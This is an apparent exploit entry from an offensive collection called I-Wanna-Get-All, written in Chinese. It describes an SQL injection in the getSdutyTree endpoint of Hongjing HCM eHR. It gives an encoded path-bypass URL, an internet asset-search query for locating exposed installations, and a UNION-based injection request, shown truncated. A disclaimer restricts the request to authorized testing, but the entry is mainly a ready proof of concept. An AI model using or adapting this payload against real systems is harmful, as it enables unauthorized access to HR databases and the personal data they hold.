---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM getSdutyTree SQL注入漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree` 接口参数存在 SQL 注入漏洞，UNION 联合查询回显（回显标记 R4gd0ll）。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%2882%29%2BCHAR%2852%29%2BCHAR%28103%29%2BCHAR%28100%29%2BCHAR%2848%29%2BCHAR%28... HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
